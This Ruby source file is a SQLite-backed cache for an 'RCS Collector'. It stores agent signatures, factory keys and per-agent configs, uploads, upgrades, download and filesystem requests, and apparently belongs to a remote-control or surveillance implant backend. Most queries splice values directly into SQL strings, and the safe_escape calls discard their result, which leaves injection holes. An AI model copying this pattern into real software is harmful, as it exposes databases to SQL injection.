#
#  Cache management for the db
#

# from RCS::Common
require 'rcs-common/trace'

require_relative 'sqlite'

module RCS
module Collector

class DBCache
  extend RCS::Tracer

  CACHE_FILE = Dir.pwd + '/config/cache.db'

  def self.create!
    begin
      db = SQLite3::Database.new CACHE_FILE
    rescue Exception => e
      trace :error, "Problems creating the cache file: #{e.message}"
    end

    # the schema of the persistent cache
    schema = ["CREATE TABLE agent_signature (signature CHAR(32))",
              "CREATE TABLE network_signature (signature CHAR(32))",
              "CREATE TABLE factory_keys (id CHAR(16), key CHAR(32))",
              "CREATE TABLE configs (bid CHAR(32), config BLOB)",
              "CREATE TABLE uploads (bid CHAR(32), uid CHAR(32), filename TEXT, content BLOB)",
              "CREATE TABLE upgrade (bid CHAR(32), uid CHAR(32), filename TEXT, content BLOB)",
              "CREATE TABLE downloads (bid CHAR(32), did CHAR(32), filename TEXT)",
              "CREATE TABLE filesystems (bid CHAR(32), fid CHAR(32), depth INT, path TEXT)"
             ]

    # create all the tables
    schema.each do |query|
      begin
        db.execute query
      rescue Exception => e
        trace :error, "Cannot execute the statement : #{e.message}"
      end
    end
    
    db.close
  end

  private_class_method :create!

  # completely wipe out the cache file
  def self.destroy!
    File.delete(CACHE_FILE) if File.exist?(CACHE_FILE)
  end

  def self.empty!
    destroy!
    create!
  end

  def self.length
    return 0 unless File.exist?(CACHE_FILE)

    count = 0
    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("SELECT COUNT(*) FROM factory_keys;") do |row|
        count = row.first
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    return count
  end

  ##############################################
  # AGENT SIGNATURE
  ##############################################

  def self.agent_signature=(sig)
    # ensure the db was already created, otherwise create it
    create! unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("DELETE FROM agent_signature;")
      db.execute("INSERT INTO agent_signature VALUES ('#{sig}');")
      db.close
    rescue Exception => e
      trace :warn, "Cannot save the cache: #{e.message}"
    end
  end

  def self.agent_signature
    return nil unless File.exist?(CACHE_FILE)

    # default value
    signature = nil

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("SELECT signature FROM agent_signature;") do |row|
        signature = row.first
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    return signature
  end

  ##############################################
  # NETWORK SIGNATURE
  ##############################################

  def self.network_signature=(sig)
    # ensure the db was already created, otherwise create it
    create! unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("DELETE FROM network_signature;")
      db.execute("INSERT INTO network_signature VALUES ('#{sig}');")
      db.close
    rescue Exception => e
      trace :warn, "Cannot save the cache: #{e.message}"
    end
  end

  def self.network_signature
    return nil unless File.exist?(CACHE_FILE)

    # default value
    signature = nil

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("SELECT signature FROM network_signature;") do |row|
        signature = row.first
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    return signature
  end

  ##############################################
  # FACTORY KEYS
  ##############################################

  def self.add_factory_keys(factory_keys)
    # ensure the db was already created, otherwise create it
    create! unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      factory_keys.each_pair do |key, value|
        db.execute("INSERT INTO factory_keys VALUES ('#{key}','#{value}');")
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot save the cache: #{e.message}"
    end
  end

  def self.factory_keys
    return {} unless File.exist?(CACHE_FILE)

    factory_keys = {}
    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("SELECT * FROM factory_keys;") do |row|
        factory_keys[row[0]] = row[1]
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    return factory_keys
  end

  ##############################################
  # CONFIG
  ##############################################

  def self.new_conf?(bid)
    return false unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT bid FROM configs WHERE bid = '#{bid}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end
    
    return (ret.empty?) ? false : true
  end

  def self.new_conf(bid)
    return nil unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT config FROM configs WHERE bid = '#{bid}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    # return only the config content
    return ret.first.first unless ret.nil? or ret.first.nil?
    return nil
  end

  def self.save_conf(bid, config)
    # ensure the db was already created, otherwise create it
    create! unless File.exist?(CACHE_FILE)
    
    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("INSERT INTO configs VALUES ('#{bid}', ? )", SQLite3::Blob.new(config))
      db.close
    rescue Exception => e
      trace :warn, "Cannot save the cache: #{e.message}"
    end
  end

  def self.del_conf(bid)
    return unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("DELETE FROM configs WHERE bid = '#{bid}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot write the cache: #{e.message}"
    end
  end

  ##############################################
  # UPLOADS
  ##############################################

  def self.new_uploads?(bid)
    return false unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT uid FROM uploads WHERE bid = '#{bid}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    return (ret.empty?) ? false : true
  end

  def self.new_upload(bid)
    return {}, 0 unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE

      # take just the first one
      # the others will be sent in later requests
      ret = db.execute("SELECT uid, filename, content FROM uploads " +
                       "WHERE bid = '#{bid}' " +
                       "ORDER BY uid " +
                       "LIMIT 1")
      count = db.execute("SELECT COUNT(*) FROM uploads WHERE bid = '#{bid}';")

      # how many upload do we have still to send after this one ?
      left = count[0][0].to_i - 1

      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    ret = ret.first
    return nil, 0 if ret.nil?

    return { :id => ret[0], :upload => {:filename => ret[1], :content => ret[2]}}, left
  end

  def self.save_uploads(bid, uploads)
    # ensure the db was already created, otherwise create it
    create! unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      uploads.each_pair do |key, value|
        SQLite3::Database.safe_escape value[:filename]
        db.execute("INSERT INTO uploads VALUES ('#{bid}', '#{key}', '#{value[:filename]}', ? )", SQLite3::Blob.new(value[:content]))
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot save the cache: #{e.message}"
    end
  end

  def self.del_upload(bid, id)
    return unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("DELETE FROM uploads WHERE bid = '#{bid}' AND uid = '#{id}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot write the cache: #{e.message}"
    end
  end

  ##############################################
  # UPGRADE
  ##############################################

  def self.new_upgrade?(bid)
    return false unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT uid FROM upgrade WHERE bid = '#{bid}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    return (ret.empty?) ? false : true
  end

  def self.new_upgrade(bid)
    return {}, 0 unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE

      # take just the first one
      # the others will be sent in later requests
      ret = db.execute("SELECT uid, filename, content FROM upgrade " +
                       "WHERE bid = '#{bid}' " +
                       "ORDER BY uid " +
                       "LIMIT 1")
      count = db.execute("SELECT COUNT(*) FROM upgrade WHERE bid = '#{bid}';")

      # how many upgrade do we have still to send after this one ?
      left = count[0][0].to_i - 1

      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    ret = ret.first
    return nil, 0 if ret.nil?

    return { :id => ret[0], :upgrade => {:filename => ret[1], :content => ret[2]}}, left
  end

  def self.save_upgrade(bid, upgrade)
    # ensure the db was already created, otherwise create it
    create! unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      upgrade.each_pair do |key, value|
        db.execute("INSERT INTO upgrade VALUES ('#{bid}', '#{key}', '#{value[:filename]}', ? )", SQLite3::Blob.new(value[:content]))
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot save the cache: #{e.message}"
    end
  end

  def self.del_upgrade(bid, id)
    return unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("DELETE FROM upgrade WHERE bid = '#{bid}' AND uid = '#{id}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot write the cache: #{e.message}"
    end
  end

  def self.clear_upgrade(bid)
    return unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("DELETE FROM upgrade WHERE bid = '#{bid}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot write the cache: #{e.message}"
    end
  end
  
  ##############################################
  # DOWNLOADS
  ##############################################

  def self.new_downloads?(bid)
    return false unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT did FROM downloads WHERE bid = '#{bid}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    return (ret.empty?) ? false : true
  end

  def self.new_downloads(bid)
    return {} unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT did, filename FROM downloads WHERE bid = '#{bid}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    downloads = {}
    # parse the results
    ret.each do |elem|
      downloads[elem[0]] = elem[1]
    end
    return downloads
  end

  def self.save_downloads(bid, downloads)
    # ensure the db was already created, otherwise create it
    create! unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      downloads.each_pair do |key, value|
        SQLite3::Database.safe_escape value
        db.execute("INSERT INTO downloads VALUES ('#{bid}', '#{key}', '#{value}' )")
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot save the cache: #{e.message}"
    end
  end

  def self.del_downloads(bid)
    return unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("DELETE FROM downloads WHERE bid = '#{bid}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot write the cache: #{e.message}"
    end
  end

  ##############################################
  # FILESYSTEM
  ##############################################

  def self.new_filesystems?(bid)
    return false unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT fid FROM filesystems WHERE bid = '#{bid}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    return (ret.empty?) ? false : true
  end

  def self.new_filesystems(bid)
    return {} unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      ret = db.execute("SELECT fid, depth, path FROM filesystems WHERE bid = '#{bid}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot read the cache: #{e.message}"
    end

    filesystems = {}
    # parse the results
    ret.each do |elem|
      filesystems[elem[0]] = {:depth => elem[1], :path => elem[2]}
    end
    return filesystems
  end

  def self.save_filesystems(bid, filesystems)
    # ensure the db was already created, otherwise create it
    create! unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      filesystems.each_pair do |key, value|
        SQLite3::Database.safe_escape value[:path]
        db.execute("INSERT INTO filesystems VALUES ('#{bid}', '#{key}', #{value[:depth]}, '#{value[:path]}' )")
      end
      db.close
    rescue Exception => e
      trace :warn, "Cannot save the cache: #{e.message}"
    end
  end

  def self.del_filesystems(bid)
    return unless File.exist?(CACHE_FILE)

    begin
      db = SQLite3::Database.open CACHE_FILE
      db.execute("DELETE FROM filesystems WHERE bid = '#{bid}';")
      db.close
    rescue Exception => e
      trace :warn, "Cannot write the cache: #{e.message}"
    end
  end

end #Cache

end #Collector::
end #RCS::